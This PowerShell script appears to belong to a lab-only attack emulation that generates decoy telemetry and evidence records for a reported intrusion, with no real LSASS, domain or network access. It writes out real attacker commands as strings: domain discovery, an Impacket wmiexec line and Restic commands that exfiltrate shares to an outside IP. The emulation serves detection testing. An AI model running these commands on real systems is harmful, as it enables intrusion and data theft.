#Requires -Version 5.1
#Requires -RunAsAdministrator
[CmdletBinding()]
param([switch]$LabConfirmed)
. "$PSScriptRoot\NitrogenSim-utilities.ps1"
Assert-NitrogenSafety -LabConfirmed:$LabConfirmed
$p = Initialize-NitrogenEnvironment
if (-not (Test-Path (Join-Path $p.Notepad 'python.exe'))) { throw 'Run phase 1 first' }
$python = Join-Path $p.Notepad 'python.exe'

$credentialEvidence = [ordered]@{
    mode='negative execution record'
    observed=@(
        @{offsetHours=2;host='beachhead';target='lsass.exe';outcome='shared local administrator credential';simulatedAccess=$false},
        @{offsetHours=4;host='server';target='lsass.exe';outcome='domain administrator credential';simulatedAccess=$false}
    )
    safeguards=@{processHandlesOpened=0;credentialsRead=0;secretsStored=0;accountsChanged=0}
}
Write-NitrogenFile (Join-Path $p.Evidence 'credential-access-negative-record.json') ($credentialEvidence | ConvertTo-Json -Depth 8) 'LSASS evidence without access'
Add-NitrogenTimeline 120 'credential-access' 'Reported LSASS access represented without touching LSASS' @{handlesOpened=0;credentials='none';technique='T1003.001'}

$discovery = @(
    'net group "domain admins" /domain','ipconfig /all','nltest /domain_trusts','net localgroup administrators',
    'net group "Domain Computers" /domain','nltest /dclist:REDACTED','Invoke-FindLocalAdminAccess',
    'Get-DomainComputer -Properties dnshostname','BloodHound collection'
)
foreach ($command in $discovery) { Invoke-NitrogenDecoy $python $command }
$discoveryRecord = [ordered]@{
    reportedCommands=$discovery
    actual='each command was echoed by a renamed signed cmd.exe; no domain query occurred'
    powerview=@{reportedListeners=@('127.0.0.1:33121','127.0.0.1:54350');moduleExecuted=$false}
    bloodhound=@{collectorExecuted=$false;archive='bloodhound-output.zip.canary';records=0}
}
Write-NitrogenFile (Join-Path $p.Evidence 'discovery-record.json') ($discoveryRecord | ConvertTo-Json -Depth 8) 'domain discovery evidence'
Write-NitrogenFile (Join-Path $p.Evidence 'bloodhound-output.zip.canary') 'INERT BloodHound output marker. No directory service was queried.' 'BloodHound archive canary'
Invoke-NitrogenLoopback 33121 '127.0.0.1:33121' 'reported PowerView localhost listener'
Invoke-NitrogenLoopback 54350 '127.0.0.1:54350' 'reported PowerView localhost listener'
Add-NitrogenTimeline 180 'discovery' 'Domain, trust, host, share, and administrator discovery telemetry generated' @{queries='echo-only';directoryAccess=$false;techniques=@('T1087.001','T1069.001','T1069.002','T1482','T1018','T1135')}

foreach ($hostName in @('BEACHHEAD','APP-SRV01','FILE-SRV01','BACKUP-SRV01','DC01')) {
    $hostPath = Join-Path $p.Lateral $hostName
    New-Item $hostPath -ItemType Directory -Force | Out-Null
    Write-NitrogenFile (Join-Path $hostPath 'host-record.json') (([ordered]@{syntheticHost=$hostName;remoteSystemTouched=$false;domainControllerTouched=$false;reportedTransport=@('RDP','SMB','WMI')} | ConvertTo-Json)) 'synthetic host record'
}
$wmiexec = Join-Path $p.Initial 'wmiexec.exe'
New-NitrogenDecoy $wmiexec 'Impacket wmiexec behavior decoy'
Invoke-NitrogenDecoy $wmiexec 'wmiexec.py REDACTED/admin@APP-SRV01 cmd.exe /Q /c whoami'
Invoke-NitrogenDecoy $python 'download Python.zip and wo12.py/wo14.py to APP-SRV01'
$lateralRecord = [ordered]@{
    mode='local synthetic host folders only';rdpSessions=0;smbAdminShares=0;wmiConnections=0;remoteProcesses=0
    reported=@('Cobalt Strike injection into winlogon.exe','RDP','Impacket wmiexec','SMB/admin shares','WMI','possible pass-the-hash')
}
Write-NitrogenFile (Join-Path $p.Evidence 'lateral-movement-record.json') ($lateralRecord | ConvertTo-Json -Depth 7) 'lateral movement evidence'
Add-NitrogenTimeline 240 'lateral-movement' 'Server pivot represented with local host folders and decoy process telemetry' @{remoteConnections=0;remoteExecution=$false;techniques=@('T1021.001','T1021.002','T1047','T1570')}

foreach ($relative in @('Finance\FY2023.xlsx','Legal\matters.docx','Engineering\roadmap.pdf','HR\roster.csv')) {
    Write-NitrogenFile (Join-Path $p.Shares $relative) "Generated canary data for $relative. Not copied from any user or share." 'generated file-server canary'
}
$restic = Join-Path $p.Exfil 'restic.exe'
New-NitrogenDecoy $restic 'Restic exfiltration decoy'
Write-NitrogenFile (Join-Path $p.Exfil 'ppp.txt') 'GENERATED-NON-SECRET-CANARY-PASSWORD' 'generated Restic password canary'
$resticRecord = [ordered]@{
    reportedRepository='rest:http://195.123.226.84:8000/'
    reportedCommands=@(
        'restic.exe -r rest:http://195.123.226.84:8000/ init --password-file ppp.txt',
        'restic.exe -r rest:http://195.123.226.84:8000/ --password-file ppp.txt --use-fs-snapshot --verbose backup "F:\Shares\REDACTED"'
    )
    contentType='application/vnd.x.restic.rest.v2'
    actualDestination='127.0.0.1:8000';proxy=$false;bytesTransferred=0;vssSnapshotCreated=$false;filesReadFromUserShares=0
}
Write-NitrogenFile (Join-Path $p.Evidence 'restic-exfiltration.json') ($resticRecord | ConvertTo-Json -Depth 8) 'exfiltration evidence'
Invoke-NitrogenDecoy $restic $resticRecord.reportedCommands[0]
Invoke-NitrogenDecoy $restic $resticRecord.reportedCommands[1]
Invoke-NitrogenLoopback 8000 '195.123.226.84:8000' 'Restic REST v2'
Add-NitrogenTimeline 360 'collection-exfiltration' 'Restic commands and HTTP signature represented' @{bytesTransferred=0;vssSnapshot=$false;techniques=@('T1039','T1048')}
Write-NitrogenFile (Join-Path $p.Evidence 'day7-backup-console-review.json') (([ordered]@{offsetHours=144;reported='backup management console review';consoleAccessed=$false;backupChanged=$false;credentialsUsed=$false} | ConvertTo-Json)) 'backup console negative-execution record'
Add-NitrogenTimeline 8640 'discovery' 'Day-seven backup console review represented as evidence only' @{consoleAccessed=$false;backupChanged=$false}
